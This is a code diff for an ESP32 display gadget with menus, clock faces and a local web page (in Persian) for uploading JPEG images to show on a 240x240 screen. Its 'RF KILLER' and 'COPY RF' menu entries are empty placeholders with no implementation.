+        inMemeMode = true;
+        tft.fillScreen(TFT_BLACK);
+        tft.setTextColor(TFT_WHITE, TFT_BLACK);
+        tft.setTextDatum(MC_DATUM);
+        if (!SPIFFS.begin(true))
+        {
+            tft.drawString("SPIFFS Error!", tft.width() / 2, tft.height() / 2, 4);
+            delay(2000);
+            return;
+        }
+
+        // Setup JPEG decoder
+        TJpgDec.setJpgScale(1);
+        TJpgDec.setSwapBytes(true);
+        TJpgDec.setCallback(tft_output);
+
+        String ip = WiFi.localIP().toString();
+        int16_t textWidth = ip.length() * 12;
+        int16_t x = (240 - textWidth) / 2;
+        int16_t y = (240 - 8) / 2;
+        tft.setCursor(x, y);
+        tft.setTextColor(HIGHLIGHT_COLOR);
+        tft.print(ip);
+    }
+    else if (currentMainSelection == 2)
+    {
+        currentMenu = JUMPERS_MENU;
+        currentJumpersSelection = 0;
+        needRedraw = true;
+    }
+    else if (currentMainSelection == 3)
+    {
+        // RF KILLER functionality
+        // Will be implemented later
+    }
+    else if (currentMainSelection == 4)
+    {
+        // COPY RF functionality
+        // Will be implemented later
+    }
+}
+
+void handleClockSelection()
+{
+    if (currentClockSelection == CLOCK_MENU_ITEMS - 1)
+    {
+        currentMenu = MAIN_MENU;
+        needRedraw = true;
+    }
+    else
+    {
+        currentClockType = currentClockSelection;
+        currentMenu = CLOCK_DISPLAY;
+        needRedraw = true;
+    }
+}
+
+void handleClockDisplay()
+{
+    switch (currentClockType)
+    {
+    case 0:
+        drawDigitalClock24();
+        break;
+    case 1:
+        drawMatrixClock();
+        break;
+    case 2:
+        drawAnalogClock();
+        break;
+    case 3:
+        drawModernClock();
+        break;
+    case 4:
+        drawSkullClock();
+        break;
+    }
+}
+
+void initSPIFFS()
+{
+    if (!SPIFFS.begin(true))
+    {
+        Serial.println("SPIFFS Mount Failed. Formatting...");
+        if (!SPIFFS.format())
+        {
+            Serial.println("SPIFFS Format Failed");
+            return;
+        }
+    }
+
+    // Force format if space is low
+    size_t totalBytes = SPIFFS.totalBytes();
+    size_t usedBytes = SPIFFS.usedBytes();
+    if ((totalBytes - usedBytes) < 100000)
+    { // If less than 100KB free
+        Serial.println("Low space detected. Formatting SPIFFS...");
+        SPIFFS.format();
+        if (!SPIFFS.begin(true))
+        {
+            Serial.println("SPIFFS Mount Failed after formatting");
+            return;
+        }
+    }
+
+    // List all files
+    File root = SPIFFS.open("/");
+    File file = root.openNextFile();
+    while (file)
+    {
+        String fileName = file.name();
+        size_t fileSize = file.size();
+        Serial.printf("File: %s, Size: %d bytes\n", fileName.c_str(), fileSize);
+        file = root.openNextFile();
+    }
+    root.close();
+
+    totalBytes = SPIFFS.totalBytes();
+    usedBytes = SPIFFS.usedBytes();
+    Serial.printf("SPIFFS Total: %d bytes\n", totalBytes);
+    Serial.printf("SPIFFS Used: %d bytes\n", usedBytes);
+    Serial.printf("SPIFFS Free: %d bytes\n", totalBytes - usedBytes);
+}
+
+void displayImage(fs::FS &fs, const char *path)
+{
+    Serial.printf("Trying to display image from: %s\n", path);
+    tft.fillScreen(TFT_BLACK);
+
+    File file = fs.open(path);
+    if (!file)
+    {
+        Serial.println("Failed to open file for reading");
+        return;
+    }
+
+    size_t fileSize = file.size();
+    Serial.printf("File size: %d bytes\n", fileSize);
+
+    uint8_t *buf = (uint8_t *)malloc(fileSize);
+    if (!buf)
+    {
+        Serial.printf("Failed to allocate %d bytes\n", fileSize);
+        file.close();
+        return;
+    }
+
+    size_t bytesRead = file.read(buf, fileSize);
+    file.close();
+
+    if (bytesRead != fileSize)
+    {
+        Serial.printf("Read failed. Got %d of %d bytes\n", bytesRead, fileSize);
+        free(buf);
+        return;
+    }
+
+    // Check first few bytes to verify JPEG header
+    if (fileSize > 2 && buf[0] == 0xFF && buf[1] == 0xD8)
+    {
+        Serial.println("Valid JPEG header detected");
+    }
+    else
+    {
+        Serial.println("Invalid JPEG header!");
+        Serial.printf("First bytes: %02X %02X\n", buf[0], buf[1]);
+        free(buf);
+        return;
+    }
+
+    uint16_t w = 0, h = 0;
+    TJpgDec.getJpgSize(&w, &h, buf, fileSize);
+    Serial.printf("Image dimensions: %dx%d\n", w, h);
+
+    // Calculate display position to center the image
+    uint16_t x = (tft.width() - w) / 2;
+    uint16_t y = (tft.height() - h) / 2;
+
+    Serial.printf("Drawing at position: %d,%d\n", x, y);
+    bool success = TJpgDec.drawJpg(x, y, buf, fileSize);
+
+    free(buf);
+
+    if (!success)
+    {
+        Serial.println("Failed to decode/display image");
+    }
+    else
+    {
+        Serial.println("Image displayed successfully");
+    }
+}
+
+// تابع جدید برای نمایش پایدار تصویر
+void displayImageStable(fs::FS &fs, const char *path)
+{
+    Serial.printf("Displaying image from: %s\n", path);
+
+    // پاک کردن صفحه
+    tft.fillScreen(TFT_BLACK);
+    delay(50);
+
+    File file = fs.open(path);
+    if (!file)
+    {
+        Serial.println("Failed to open file for reading");
+        return;
+    }
+
+    size_t fileSize = file.size();
+    uint8_t *buf = (uint8_t *)malloc(fileSize + 100);
+    if (!buf)
+    {
+        Serial.println("Memory allocation failed");
+        file.close();
+        return;
+    }
+
+    memset(buf, 0, fileSize + 100);
+    size_t bytesRead = file.read(buf, fileSize);
+    file.close();
+
+    if (bytesRead != fileSize)
+    {
+        Serial.printf("Read failed: %d/%d bytes\n", bytesRead, fileSize);
+        free(buf);
+        return;
+    }
+
+    // Check JPEG header
+    if (!(fileSize > 2 && buf[0] == 0xFF && buf[1] == 0xD8))
+    {
+        Serial.println("Not a valid JPEG");
+        free(buf);
+        return;
+    }
+
+    // Get original image dimensions
+    uint16_t originalW = 0, originalH = 0;
+    TJpgDec.getJpgSize(&originalW, &originalH, buf, fileSize);
+    Serial.printf("Original dimensions: %dx%d\n", originalW, originalH);
+
+    // Calculate scaling factor to fit 240x240
+    float scaleW = float(DISPLAY_WIDTH) / originalW;
+    float scaleH = float(DISPLAY_HEIGHT) / originalH;
+    float scale = min(scaleW, scaleH); // Use smaller scale to fit screen
+
+    // Calculate new dimensions
+    uint16_t newW = originalW * scale;
+    uint16_t newH = originalH * scale;
+
+    // Calculate position to center the image
+    uint16_t x = (DISPLAY_WIDTH - newW) / 2;
+    uint16_t y = (DISPLAY_HEIGHT - newH) / 2;
+
+    Serial.printf("Scaled dimensions: %dx%d at position %d,%d\n", newW, newH, x, y);
+
+    // Configure decoder
+    TJpgDec.setJpgScale(1); // No decoder scaling, we'll handle it
+    TJpgDec.setSwapBytes(true);
+    TJpgDec.setCallback(tft_output);
+
+    // Start display transaction
+    tft.startWrite();
+
+    // If image is larger than display, scale down
+    if (originalW > DISPLAY_WIDTH || originalH > DISPLAY_HEIGHT)
+    {
+        // Set viewport for scaling
+        tft.setViewport(x, y, newW, newH);
+        tft.setRotation(0);
+
+        // Scale and draw
+        bool success = TJpgDec.drawJpg(0, 0, buf, fileSize);
+
+        // Reset viewport
+        tft.resetViewport();
+    }
+    else
+    {
+        // Draw smaller images at center without scaling
+        bool success = TJpgDec.drawJpg(x, y, buf, fileSize);
+    }
+
+    tft.endWrite();
+
+    free(buf);
+    delay(50);
+
+    Serial.println("Image display completed");
+}
+
+void cleanupOldFiles()
+{
+    File root = SPIFFS.open("/");
+    File file = root.openNextFile();
+    int fileCount = 0;
+
+    // Count the number of files
+    while (file)
+    {
+        fileCount++;
+        file = root.openNextFile();
+    }
+
+    // If the number of files exceeds the limit, delete the oldest file
+    if (fileCount >= MAX_FILES)
+    {
+        String oldestFile = uploadedFiles[currentFileIndex];
+        if (SPIFFS.exists(oldestFile))
+        {
+            Serial.printf("Removing old file: %s\n", oldestFile.c_str());
+            SPIFFS.remove(oldestFile);
+        }
+    }
+
+    root.close();
+}
+
+void handleUpload()
+{
+    HTTPUpload &upload = server.upload();
+    static File uploadFile;
+    static size_t uploadSize = 0;
+    static String uploadPath;
+
+    switch (upload.status)
+    {
+    case UPLOAD_FILE_START:
+    {
+        uploadPath = "/image_" + String(currentFileIndex) + ".jpg";
+        Serial.printf("Upload Start: %s\n", uploadPath.c_str());
+        uploadSize = 0;
+
+        cleanupOldFiles();
+
+        if (SPIFFS.exists(uploadPath))
+        {
+            SPIFFS.remove(uploadPath);
+        }
+
+        uploadFile = SPIFFS.open(uploadPath, FILE_WRITE);
+        if (!uploadFile)
+        {
+            Serial.println("Failed to open file for writing");
+            server.send(500, "text/plain", "Failed to open file for writing");
+            return;
+        }
+
+        uploadedFiles[currentFileIndex] = uploadPath;
+        currentFileIndex = (currentFileIndex + 1) % MAX_FILES;
+        break;
+    }
+
+    case UPLOAD_FILE_WRITE:
+    {
+        if (!uploadFile)
+        {
+            return;
+        }
+
+        if (uploadFile.write(upload.buf, upload.currentSize) != upload.currentSize)
+        {
+            Serial.println("Write failed");
+            uploadFile.close();
+            server.send(500, "text/plain", "Write failed");
+            return;
+        }
+        uploadSize += upload.currentSize;
+        Serial.printf("Written: %d bytes\n", uploadSize);
+        break;
+    }
+
+    case UPLOAD_FILE_END:
+    {
+        if (uploadFile)
+        {
+            uploadFile.close();
+            Serial.printf("Upload Success: %d bytes\n", upload.totalSize);
+            delay(50); // تاخیر کوتاه قبل از نمایش
+            displayImageStable(SPIFFS, uploadPath.c_str());
+            server.send(200, "text/plain", "OK");
+        }
+        break;
+    }
+
+    case UPLOAD_FILE_ABORTED:
+    {
+        Serial.println("Upload aborted");
+        if (uploadFile)
+        {
+            uploadFile.close();
+            SPIFFS.remove(uploadPath);
+        }
+        server.send(400, "text/plain", "Upload aborted");
+        break;
+    }
+    }
+}
+
+void setup()
+{
+    esp_task_wdt_init(30, false); // 30 ثانیه تایم‌اوت
+    Serial.begin(115200);
+    randomSeed(analogRead(0));
+
+    pinMode(BUTTON_UP, INPUT_PULLUP);
+    pinMode(BUTTON_DOWN, INPUT_PULLUP);
+    pinMode(BUTTON_SELECT, INPUT_PULLUP);
+
+    tft.init();
+    tft.setRotation(0);
+    tft.fillScreen(MENU_BG);
+
+    // Initialize TJpg_Decoder
+    TJpgDec.setJpgScale(1);
+    TJpgDec.setSwapBytes(true);
+    TJpgDec.setCallback(tft_output);
+
+    WiFi.begin(ssid, password);
+
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setTextSize(1);
+    tft.setCursor(20, 100);
+    tft.print("Connecting to WiFi");
+
+    int attempts = 0;
+    while (WiFi.status() != WL_CONNECTED && attempts < 20)
+    {
+        delay(500);
+        tft.print(".");
+        attempts++;
+    }
+
+    if (WiFi.status() == WL_CONNECTED)
+    {
+        tft.fillScreen(MENU_BG);
+        tft.setCursor(20, 100);
+        tft.print("Connected!");
+        tft.setCursor(20, 120);
+        tft.print(WiFi.localIP().toString());
+        delay(1000);
+
+        // Initialize SPIFFS
+        if (!SPIFFS.begin(true))
+        {
+            Serial.println("SPIFFS Mount Failed");
+            tft.setCursor(20, 140);
+            tft.print("SPIFFS Error!");
+            delay(1000);
+        }
+
+        updateTimeFromNTP();
+    }
+    else
+    {
+        tft.fillScreen(MENU_BG);
+        tft.setCursor(20, 100);
+        tft.print("WiFi Failed!");
+        delay(2000);
+    }
+
+    server.on("/", HTTP_GET, []()
+              { server.send(200, "text/html", R"html(
+<!DOCTYPE html>
+<html>
+<head>    <title>آپلود تصویر</title>
+    <meta name='viewport' content='width=device-width,initial-scale=1'>
+    <meta charset="UTF-8">
+    <link href='https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css' rel='stylesheet'>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body { 
+            font-family: Vazirmatn, Tahoma, Arial;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            direction: rtl;
+        }
+        
+        .container { 
+            background: white;
+            padding: 40px;
+            border-radius: 24px;
+            margin: 20px auto;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+        }
+        
+        .container:hover {
+            transform: translateY(-5px);
+        }
+        
+        h1 { 
+            color: #2c3e50; 
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+        
+        .upload-area {
+            border: 3px dashed #e0e0e0;
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+        }
+        
+        .upload-area:hover, .upload-area.dragover {
+            border-color: #3498db;
+            background: #f7f9fc;
+        }
+        
+        .upload-area p {
+            color: #666;
+            margin: 10px 0;
+        }
+        
+        button { 
+            background: #1a73e8;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: Vazirmatn, Tahoma, Arial;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        input[type="file"] {
+            display: none;
+        }
+        
+        #preview {
+            max-width: 240px;
+            max-height: 240px;
+            margin: 20px auto;
+            border-radius: 12px;
+            display: none;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+        
+        #preview.visible {
+            display: block;
+        }
+        
+        #status {
+            color: #e74c3c;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        
+        .progress {
+            margin: 15px 0;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 3px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar-fill {
+            height: 100%;
+            background: #3498db;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .upload-area {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class='container'>
+        <h1>آپلود تصویر</h1>
+        <form id="uploadForm" method='POST' action='/upload' enctype='multipart/form-data' onsubmit='return handleSubmit(event)'>
+            <div class="upload-area" id="dropZone">
+                <input type='file' name='image' accept='image/*' id="fileInput" onchange='handleImageSelect(event)'>
+                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                    <polyline points="17 8 12 3 7 8"/>
+                    <line x1="12" y1="3" x2="12" y2="15"/>
+                </svg>
+                <p>برای انتخاب تصویر کلیک کنید یا فایل را اینجا رها کنید</p>
+                <p style="font-size: 12px; color: #999;">حداکثر اندازه: 64KB</p>
+            </div>
+            <img id="preview">
+            <div id='status'></div>
+            <div class="progress"></div>
+            <div class="progress-bar">
+                <div class="progress-bar-fill" id="progressBarFill"></div>
+            </div>
+            <button type='submit'>
+                <span class="loading" style="display: none;"></span>
+                <span class="button-text">آپلود تصویر</span>
+            </button>
+        </form>
+    </div>    <script>
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const progressBarFill = document.getElementById('progressBarFill');
+        const loadingSpinner = document.querySelector('.loading');
+        const buttonText = document.querySelector('.button-text');
+        
+        // Drag and Drop handlers
+        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+            dropZone.addEventListener(eventName, preventDefaults, false);
+            document.body.addEventListener(eventName, preventDefaults, false);
+        });
+        
+        ['dragenter', 'dragover'].forEach(eventName => {
+            dropZone.addEventListener(eventName, highlight, false);
+        });
+        
+        ['dragleave', 'drop'].forEach(eventName => {
+            dropZone.addEventListener(eventName, unhighlight, false);
+        });
+        
+        dropZone.addEventListener('drop', handleDrop, false);
+        dropZone.addEventListener('click', () => fileInput.click());
+        
+        function preventDefaults(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+        
+        function highlight(e) {
+            dropZone.classList.add('dragover');
+        }
+        
+        function unhighlight(e) {
+            dropZone.classList.remove('dragover');
+        }
+        
+        function handleDrop(e) {
+            const dt = e.dataTransfer;
+            const file = dt.files[0];
+            handleImageSelect({ target: { files: [file] } });
+        }
+        
+        function updateStatus(message) {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.style.opacity = message ? '1' : '0';
+        }
+        
+        function updateProgress(message, percent = 0) {
+            document.querySelector('.progress').textContent = message;
+            progressBarFill.style.width = percent + '%';
+        }
+        
+        async function resizeImage(file) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const img = new Image();
+                    img.onload = function() {
+                        const canvas = document.createElement('canvas');
+                        let width = img.width;
+                        let height = img.height;
+                        
+                        // Calculate new dimensions while maintaining aspect ratio
+                        if (width > height) {
+                            if (width > 240) {
+                                height = Math.round((height * 240) / width);
+                                width = 240;
+                            }
+                        } else {
+                            if (height > 240) {
+                                width = Math.round((width * 240) / height);
+                                height = 240;
+                            }
+                        }
+                        
+                        canvas.width = width;
+                        canvas.height = height;
+                        
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, width, height);
+                        
+                        // Convert to JPEG with quality adjustment
+                        canvas.toBlob((blob) => {
+                            resolve(new File([blob], file.name, {
+                                type: 'image/jpeg',
+                                lastModified: Date.now()
+                            }));
+                        }, 'image/jpeg', 0.8); // 0.8 = 80% quality
+                    };
+                    img.src = e.target.result;
+                };
+                reader.readAsDataURL(file);
+            });
+        }
+
+        async function handleImageSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            updateStatus('');
+            updateProgress('Processing image...');
+            
+            try {
+                // Show preview of original image
+                const preview = document.getElementById('preview');
+                preview.style.display = 'block';
+                preview.src = URL.createObjectURL(file);
+                
+                // Resize and compress if needed
+                if (file.size > 64*1024 || file.type !== 'image/jpeg') {
+                    const resizedFile = await resizeImage(file);
+                    if (resizedFile.size > 64*1024) {
+                        updateStatus('Image is still too large after compression. Please try a smaller image.');
+                        return;
+                    }
+                    window.processedFile = resizedFile;
+                    updateProgress(`Image processed: ${Math.round(resizedFile.size/1024)}KB`);
+                } else {
+                    window.processedFile = file;
+                    updateProgress(`Image size OK: ${Math.round(file.size/1024)}KB`);
+                }
+            } catch (error) {
+                updateStatus('Error processing image: ' + error.message);
+                console.error(error);
+            }
+        }        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            const file = window.processedFile;
+            if (!file) {
+                updateStatus('لطفاً یک تصویر انتخاب کنید');
+                return false;
+            }
+            
+            updateStatus('');
+            loadingSpinner.style.display = 'inline-block';
+            buttonText.textContent = 'در حال آپلود...';
+            const button = document.querySelector('button');
+            button.disabled = true;
+            
+            const formData = new FormData();
+            formData.append('image', file);
+            
+            try {
+                let uploadProgress = 0;
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    updateProgress('آپلود با موفقیت انجام شد!', 100);
+                    buttonText.textContent = 'آپلود شد! ✓';
+                    setTimeout(() => {
+                        buttonText.textContent = 'آپلود تصویر';
+                        loadingSpinner.style.display = 'none';
+                        button.disabled = false;
+                        updateProgress('');
+                        progressBarFill.style.width = '0%';
+                    }, 2000);
+                } else {
+                    throw new Error('خطا در آپلود: ' + response.statusText);
+                }
+            } catch (error) {
+                updateStatus(error.message);
+                buttonText.textContent = 'آپلود تصویر';
+                loadingSpinner.style.display = 'none';
+                button.disabled = false;
+                console.error(error);
+            }
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
+)html"); });
+
+    server.on("/upload", HTTP_POST, []() { /* This is handled in handleUpload() */ }, handleUpload);
+
+    server.begin();
+    drawMainMenu();
+}
+
+void loop()
+{
+    if (inMemeMode)
+    {
+        server.handleClient();
+
+        if (digitalRead(BUTTON_SELECT) == LOW)
+        {
+            delay(200);
+            inMemeMode = false;
+            server.stop();
+            currentMenu = MAIN_MENU;
+            needRedraw = true;
+            return;
+        }
+    }
+    else
+    {
+        if (currentMenu == CLOCK_DISPLAY)
+        {
+            if (digitalRead(BUTTON_SELECT) == LOW)
+            {
+                delay(200);
+                currentMenu = CLOCK_MENU;
+                needRedraw = true;
+            }
+            else
+            {
+                handleClockDisplay();
+                delay(currentClockType == 1 ? 50 : 1000);
+            }
+        }
+        else
+        {
+            if (digitalRead(BUTTON_UP) == LOW)
+            {
+                delay(200);
+                switch (currentMenu)
+                {
+                case MAIN_MENU:
+                    currentMainSelection = (currentMainSelection - 1 + MAIN_MENU_ITEMS) % MAIN_MENU_ITEMS;
+                    break;
+                case CLOCK_MENU:
+                    currentClockSelection = (currentClockSelection - 1 + CLOCK_MENU_ITEMS) % CLOCK_MENU_ITEMS;
+                    break;
+                case JUMPERS_MENU:
+                    currentJumpersSelection = (currentJumpersSelection - 1 + JUMPERS_MENU_ITEMS) % JUMPERS_MENU_ITEMS;
+                    break;
+                }
+                needRedraw = true;
+            }
+
+            if (digitalRead(BUTTON_DOWN) == LOW)
+            {
+                delay(200);
+                switch (currentMenu)
+                {
+                case MAIN_MENU:
+                    currentMainSelection = (currentMainSelection + 1) % MAIN_MENU_ITEMS;
+                    break;
+                case CLOCK_MENU:
+                    currentClockSelection = (currentClockSelection + 1) % CLOCK_MENU_ITEMS;
+                    break;
+                case JUMPERS_MENU:
+                    currentJumpersSelection = (currentJumpersSelection + 1) % JUMPERS_MENU_ITEMS;
+                    break;
+                }
+                needRedraw = true;
+            }
+
+            if (digitalRead(BUTTON_SELECT) == LOW)
+            {
+                delay(200);
+                switch (currentMenu)
+                {
+                case MAIN_MENU:
+                    handleMainSelection();
+                    break;
+                case CLOCK_MENU:
+                    handleClockSelection();
+                    break;
+                case JUMPERS_MENU:
+                    handleJumpersSelection();
+                    break;
+                }
+            }
+
+            if (needRedraw)
+            {
+                switch (currentMenu)
+                {
+                case MAIN_MENU:
+                    drawMainMenu();
+                    break;
+                case CLOCK_MENU:
+                    drawClockMenu();
+                    break;
+                case JUMPERS_MENU:
+                    drawJumpersMenu();
+                    break;
+                }
+            }
+        }
+    }
+
+    static unsigned long lastUpdate = 0;
+    if (millis() - lastUpdate > 3600000)
+    {
+        updateTimeFromNTP();
+        lastUpdate = millis();
+    }
+}
